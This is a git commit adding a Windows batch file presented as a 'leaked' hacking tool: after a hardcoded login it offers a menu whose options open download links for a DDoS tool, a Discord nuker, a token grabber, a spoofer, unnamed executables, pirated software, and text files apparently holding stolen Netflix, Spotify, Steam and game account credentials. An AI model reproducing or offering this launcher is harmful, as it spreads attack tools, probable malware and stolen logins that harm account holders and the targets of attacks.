d3b56bbc0873f27eea8a90922fec06a35194910d
wxvex <101500827+Wxvex@users.noreply.github.com>
2022-03-15 14:22:54 -0700

    Add files via upload

---
+++ savvasbrunos leaked by wavex.bat
@@ -0,0 +1,158 @@
+﻿@echo off
+chcp 65001 >nul                    Leaked By Wavex Xalara etsi
+:login
+cls
+color 02
+title *Savvasbrunos Tool 4.03
+echo                   ███████  █████  ██    ██ ██    ██  █████  ███████     ████████  ██████   ██████  ██      
+echo                   ██      ██   ██ ██    ██ ██    ██ ██   ██ ██             ██    ██    ██ ██    ██ ██      
+echo                   ███████ ███████ ██    ██ ██    ██ ███████ ███████        ██    ██    ██ ██    ██ ██      
+echo                        ██ ██   ██  ██  ██   ██  ██  ██   ██      ██        ██    ██    ██ ██    ██ ██      
+echo                   ███████ ██   ██   ████     ████   ██   ██ ███████        ██     ██████   ██████  ███████ 
+echo.                                                                                         
+echo.                                                  Created 23/01/2022                                                                                                                                    
+echo.                                             Made by Savvasbrunos#9999
+echo.                                                                                                       
+set /p user=Username :
+echo.
+set /p pass=Password :
+if %user% == user  if %pass% == user goto main
+echo Error 07, Sorry! It Appears You Have Did The Wrong Password, Or Username *Wait 5 Senconds*
+timeout 5 >nul
+goto login
+:main
+cls
+echo welcome %Savvasbrunos%
+cls
+title *Savvasbrunos Tool-Omega Tool
+color 05
+echo                                ██████  ██████  ██    ██ ███    ██  ██████  ███████ 
+echo                                ██   ██ ██   ██ ██    ██ ████   ██ ██    ██ ██      
+echo                                ██████  ██████  ██    ██ ██ ██  ██ ██    ██ ███████ 
+echo                                ██   ██ ██   ██ ██    ██ ██  ██ ██ ██    ██      ██ 
+echo                                ██████  ██   ██  ██████  ██   ████  ██████  ███████ 
+echo.                                                    
+echo.                                                                                                                  
+echo.                                                                       
+echo.                                                                   https://discord.gg/ku9Ynm7qrR
+echo.                    Ownership   Savvasbrunos#9999                                 Made By Savvasbrunos#9999
+echo.                                                                         
+echo.
+echo                (1) Omega Shop                         (8) RP Server         (15) Woofer     
+echo                (2) Nitro Gen                          (9) 100 Gifs          (16) Wish Account
+echo                (3) Nitro Sniper                       (10) PvP Server       (17) Netflix Account
+echo                (4) PhotoShop Premium                  (11) Ddos Tool        (18) GTA V Accounts
+echo                (5) Adobe Premium                      (12) Nuker            (19) Call Of Duty Accs
+echo                (6) TikTok Likes,Follower's            (13) Token Grabber    (20) Steam Account 
+echo                (7) Boofer                             (14) Spoofer_Woofer   (21) Spootify Accs
+echo.                                                                            (22) Savvasbrunos Youtube                                                    
+set /p main=Option:                                                                                                                  
+echo.                
+if %main% == 1 goto o1
+echo.
+if %main% == 2 goto o2
+echo.
+if %main% == 3 goto o3
+echo.
+if %main% == 4 goto o4
+echo.
+if %main% == 5 goto o5	
+echo.
+if %main% == 6 goto o6
+echo.
+if %main% == 7 goto o7
+echo.
+if %main% == 8 goto o8
+echo.
+if %main% == 9 goto o9
+echo.
+if %main% == 10 goto o10
+echo. 
+if %main% == 11 goto o11
+echo. 
+if %main% == 12 goto o12
+echo.
+if %main% == 13 goto o13
+echo.
+if %main% == 14 goto o14
+echo.
+if %main% == 15 goto o15
+echo.
+if %main% == 16 goto o16
+echo.
+if %main% == 17 goto o17
+echo.
+if %main% == 18 goto o18
+echo.
+if %main% == 19 goto o19
+echo.
+if %main% == 20 goto o20
+echo.
+if %main% == 21 goto o21
+if %main% == 22 goto 022
+:o1
+start https://discord.gg/MhQCKtpCqH
+goto main
+:o2
+start https://sitesgithub.github.io/nitro/index.html
+goto main
+:o3
+start https://cdn.discordapp.com/attachments/933792868693319800/933792938050330664/nitro-sniper-main.zip
+goto main
+:o4
+start https://mega.nz/folder/EF5WCADQ#QgmIyI58Kf7ed5GIjJm_RQ Code 123
+goto main
+:o5
+start https://drive.google.com/file/d/15PIes78ORBW4SMkrjZSLhjqWscK744ju/view?usp=sharing
+goto main
+:o6
+start https://zefoy.com/
+goto main
+:o7
+start https://cdn.discordapp.com/attachments/933663143933128704/933717142807908352/Bypassed_1.exe
+goto main
+:o8
+start https://mega.nz/file/agYSSRrY#NRDCMslG_e6PFh6g9uC6ePIMZ6oGSsZEsub1eahLTRk
+goto main
+:o9
+start https://cdn.discordapp.com/attachments/934150308563677246/934152718442967100/All_Gifs_Here.rar
+goto main
+:o10
+start https://mega.nz/file/ExxWBbYL#BvA4Uwu4SsDA1r2OcbnxTFSYf4ZT0jok7dHpsluafPM
+goto main
+:o11
+start https://cdn.discordapp.com/attachments/933604950511079504/933610612183953468/UDP_Unicorn.rar
+goto main
+:o12
+start https://cdn.discordapp.com/attachments/933610025325322290/933658207832915968/Hazard-Nuker-master.zip
+goto main
+:o13
+start https://discord.com/channels/923304656430583838/933605095961161808/933746900706947072
+goto main
+:o14
+start https://cdn.discordapp.com/attachments/926520971450527795/929321796728131604/Medusa_GRR.exe
+goto main
+:o15
+start https://cdn.discordapp.com/attachments/923880582247743518/934630927609495572/Dark_Doofer.bat
+goto main
+:o16
+start https://cdn.discordapp.com/attachments/934563602793386035/934564587200712704/wish_accounts.txt
+goto main
+:o17
+start https://cdn.discordapp.com/attachments/934563602793386035/934564586445750292/netflix_accounts-1.txt
+goto main
+:o18
+start https://cdn.discordapp.com/attachments/934563602793386035/934564585988558929/gta_accs-2.txt
+goto main
+:o19
+start https://cdn.discordapp.com/attachments/934563602793386035/934564584759648336/Call_Of_Duty_Checked_x15k_1.txt
+goto main
+:o20
+start https://cdn.discordapp.com/attachments/930095961471057920/934601509797261382/message.txt
+goto main
+:o21
+start https://cdn.discordapp.com/attachments/934563602793386035/934564586676441158/spotify_accounts.txt
+goto main
+:022
+start https://www.youtube.com/channel/UCJV8MM8gm6bpFAXzxdxq7IA
+goto main
